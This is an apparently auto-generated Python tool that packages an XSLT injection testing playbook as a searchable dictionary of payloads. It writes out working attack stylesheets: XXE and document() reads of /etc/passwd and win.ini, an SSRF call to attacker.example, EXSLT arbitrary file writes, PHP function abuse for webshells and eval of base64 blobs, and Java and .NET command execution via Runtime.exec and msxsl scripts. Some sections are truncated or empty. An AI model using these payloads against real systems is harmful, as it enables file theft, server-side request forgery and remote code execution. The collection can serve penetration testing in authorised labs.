#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AUTO-GENERATED from Cybermes skill: hack-skills/xslt-injection

Skill: SKILL: XSLT Injection — Testing Playbook
Desc : >-

Run:  python hack-skills-xslt-injection.py --help
      python hack-skills-xslt-injection.py --list
      python hack-skills-xslt-injection.py --dump <section>
"""
import sys, json, argparse

NAME = 'hack-skills/xslt-injection'
TITLE = 'SKILL: XSLT Injection — Testing Playbook'
DESCRIPTION = '>-'

PAYLOADS = {
    'main': ["name: xslt-injection", "description: >-", "XSLT injection testing: processor fingerprinting, XXE and document() SSRF, EXSLT write primitives, PHP/Java/.NET extension RCE surfaces. Use when user-controlled XSLT/stylesheet input or transform endpoints are in scope."],
    'skill-xslt-injection-testing-playbook': [],
    '0-quick-start': ["1. **Find sinks**: parameters named `xslt`, `stylesheet`, `transform`, `template`, SOAP stylesheets, report generators, XML\u2192HTML converters.", "2. **Probe reflection**: inject unique namespace or `xsl:value-of select=\"'marker'\"` \u2014 if output changes, execution likely.", "3. **Fingerprint** processor (\u00a71).", "4. **Escalate** by family: **document()** / **XXE** (\u00a72\u20133), **EXSLT write** (\u00a74), **PHP** (\u00a75), **Java** (\u00a76), **.NET** (\u00a77).", "**Quick probe** (harmless marker):", "```xml", "<xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\">", "<xsl:template match=\"/\">", "<xsl:value-of select=\"'XSLT_PROBE_OK'\"/>", "</xsl:template>", "</xsl:stylesheet>"],
    '1-vendor-detection': ["Use standard **system-property** reads inside expressions:", "```xml", "<xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\">", "<xsl:output method=\"text\"/>", "<xsl:template match=\"/\">", "<xsl:text>vendor=</xsl:text><xsl:value-of select=\"system-property('xsl:vendor')\"/>", "<xsl:text>&#10;version=</xsl:text><xsl:value-of select=\"system-property('xsl:version')\"/>", "<xsl:text>&#10;vendor-url=</xsl:text><xsl:value-of select=\"system-property('xsl:vendor-url')\"/>", "</xsl:template>", "</xsl:stylesheet>", "**Typical fingerprints** (examples, not exhaustive):", "Use results to select \u00a75\u2013\u00a77 paths."],
    '2-external-entity-xxe-via-xslt': ["XSLT 1.0 allows **DTD-based entities** in the stylesheet or source when the parser permits DTDs:", "```xml", "<!DOCTYPE xsl:stylesheet [", "<!ENTITY ext_file SYSTEM \"file:///etc/passwd\">", "<xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\">", "<xsl:output method=\"text\"/>", "<xsl:template match=\"/\">", "<xsl:value-of select=\"'ENTITY_START'\"/>", "<xsl:value-of select=\"&ext_file;\"/>", "<xsl:value-of select=\"'ENTITY_END'\"/>", "</xsl:template>", "</xsl:stylesheet>", "**Note**: Hardened parsers disable external DTDs \u2014 failure here does not disprove other XSLT vectors (see \u00a73)."],
    '3-file-read-via-document': ["`document()` loads another XML document into a node-set; local files often parse as XML (noisy) but **errors and partial reads** may still leak.", "**Unix example**:", "```xml", "<xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\">", "<xsl:output method=\"text\"/>", "<xsl:template match=\"/\">", "<xsl:copy-of select=\"document('/etc/passwd')\"/>", "</xsl:template>", "</xsl:stylesheet>", "**Windows example**:", "```xml", "<xsl:copy-of select=\"document('file:///c:/windows/win.ini')\"/>", "**SSRF / out-of-band**:", "```xml", "<xsl:copy-of select=\"document('http://attacker.example/ssrf')\"/>", "Chain with **error-based** or **timing** observations if inline data does not return to the client."],
    '4-file-write-via-exslt-exslt-document': ["When **EXSLT common** extension is enabled:", "```xml", "<xsl:stylesheet version=\"1.0\"", "xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"", "xmlns:exploit=\"http://exslt.org/common\"", "extension-element-prefixes=\"exploit\">", "<xsl:template match=\"/\">", "<exploit:document href=\"/tmp/evil.txt\" method=\"text\">", "<xsl:text>PROOF_CONTENT</xsl:text>", "</exploit:document>", "</xsl:template>", "</xsl:stylesheet>", "**Impact**: arbitrary file write where path permissions allow \u2014 often **RCE** via webroot, cron paths, or inclusion points."],
    '5-rce-via-php-php-function': ["Requires PHP XSLT with **`registerPHPFunctions()`**-style exposure (application misconfiguration). Namespace:", "```xml", "<xsl:stylesheet version=\"1.0\"", "xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"", "xmlns:php=\"http://php.net/xsl\">", "<xsl:output method=\"text\"/>", "<xsl:template match=\"/\">", "<xsl:value-of select=\"php:function('readfile','index.php')\"/>", "</xsl:template>", "</xsl:stylesheet>", "**Directory listing**:", "```xml", "<xsl:value-of select=\"php:function('scandir','.')\"/>", "**Dangerous patterns** (historical abuses \u2014 verify only in lab):", "- `php:function('assert', string($payload))` \u2014 environment-dependent, often deprecated/removed; chained with `include`/`require` in old apps.", "- `php:function('file_put_contents','/var/www/shell.php','<?php ...')` \u2014 **webshell write** when callable is whitelisted recklessly.", "- `preg_replace` with **`/e`** modifier (legacy PHP) \u2014 the replacement string is **evaluated as PHP**; metasploit-style chains often wrapped **base64_decode** of a blob to smuggle a **meterpreter** (or other) staged payload. Removed in PHP 7+; only relevant for ancient runtimes.", "**Legacy PHP equivalent** (illustrates the `/e` + base64 pattern \u2014 lab only):", "```php", "preg_replace('/.*/e', 'eval(base64_decode(\"BASE64_PHP_HERE\"));', '', 1);", "Surface from XSLT only if `php:function` exposes `preg_replace` to user stylesheets (rare + critical misconfiguration).", "**Tester note**: modern PHP hardening often **blocks** these; absence of RCE does not remove **document()** / **XXE**."],
    '6-rce-via-java-saxon-xalan-extensions': ["Java engines may expose **extension functions** mapping to static methods. Examples appear in historical advisories; exact syntax depends on **version and extension binding**.", "**Illustrative pattern** (conceptual \u2014 adjust to permitted extension namespace and API):", "```xml", "<xsl:stylesheet version=\"1.0\"", "xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"", "xmlns:rt=\"http://xml.apache.org/xalan/java/java.lang.Runtime\">", "<xsl:template match=\"/\">", "<xsl:variable name=\"rtobject\" select=\"rt:getRuntime()\"/>", "<xsl:value-of select=\"rt:exec($rtobject,'/bin/sh -c id')\"/>", "</xsl:template>", "</xsl:stylesheet>", "**Saxon-style static Java integration** (highly configuration-dependent):", "```text", "Runtime:exec(Runtime:getRuntime(), 'cmd.exe /C ping 192.0.2.1')", "Replace `192.0.2.1` with your lab listener / documentation IP (RFC 5737 TEST-NET).", "**Operational guidance**: if extensions are disabled (common secure default), pivot to **document()**, SSRF, or **deserialization** elsewhere \u2014 not every XSLT endpoint runs with extensions on."],
    '7-rce-via-net-msxsl-script': ["When Microsoft XSLT **script blocks** are allowed:", "```xml", "<xsl:stylesheet version=\"1.0\"", "xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"", "xmlns:msxsl=\"urn:schemas-microsoft-com:xslt\"", "extension-element-prefixes=\"msxsl\">", "<msxsl:script language=\"C#\" implements-prefix=\"user\">", "<![CDATA[", "public string xexec() {", "System.Diagnostics.Process.Start(\"cmd.exe\", \"/c whoami\");", "return \"ok\";", "</msxsl:script>", "<xsl:template match=\"/\">", "<xsl:value-of select=\"user:xexec()\"/>", "</xsl:template>", "</xsl:stylesheet>", "**Default secure configs** often disable scripts \u2014 treat this as **when enabled** behavior."],
    '8-decision-tree': ["```text", "User influences XSLT or XML transform?", "NO --> stop (out of scope)", "+---------------+---------------+", "output reflects                       no reflection", "injected logic?                    try blind channels", "v                               v", "system-property()                 errors, OOB, timing", "fingerprint vendor                      |", "+-----------+-----------+                   |", "libxslt     Java        .NET              document()", "document()   Saxon/Xalan  msxsl:script?      SSRF/file", "EXSLT write  extensions?      |                   |", "v           v           v                   v", "file R/W     rt/exec      cmd.exe /c         map evidence"],
    'payloads-all-the-things-pat-note': ["The **PayloadsAllTheThings** project documents many injection classes; for **XSLT**, maintainer notes indicate **no dedicated maintained tool** section comparable to SQLi/XSS toolchains \u2014 exploitation is **processor- and configuration-specific**, driven by proxy/manual payloads and custom scripts. Plan time for **local lab reproduction** with the same engine/version as the target when possible."],
    'tooling-practical': ["No single universal scanner replaces **version-specific** behavior validation."],
    'related': ["- **xxe-xml-external-entity** \u2014 DTD/entity hardening, generic XML parsers (`../xxe-xml-external-entity/SKILL.md`).", "- **ssrf-server-side-request-forgery** \u2014 when `document(http:\u2026)` or entity URLs cause server fetches (`../ssrf-server-side-request-forgery/SKILL.md`)."],
}

def main():
    ap = argparse.ArgumentParser(description=DESCRIPTION, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--list", action="store_true", help="list sections")
    ap.add_argument("--dump", metavar="SECTION", help="dump payloads for a section")
    ap.add_argument("--search", metavar="KEYWORD", help="search payloads")
    args = ap.parse_args()
    if args.list or not (args.dump or args.search):
        print("=== %s ===" % TITLE)
        print(DESCRIPTION)
        print()
        print("Sections (%d):" % len(PAYLOADS))
        for k in PAYLOADS:
            print("  -", k, "(%d payloads)" % len(PAYLOADS[k]))
        if args.list:
            return
    if args.dump:
        if args.dump not in PAYLOADS:
            print("Section not found. Available:", list(PAYLOADS.keys()))
            sys.exit(1)
        for p in PAYLOADS[args.dump]:
            print(p)
        return
    if args.search:
        q = args.search.lower()
        hits = 0
        for k, v in PAYLOADS.items():
            for p in v:
                if q in p.lower():
                    print("[%s] %s" % (k, p))
                    hits += 1
        print("\n%d hits" % hits)
        return

if __name__ == "__main__":
    main()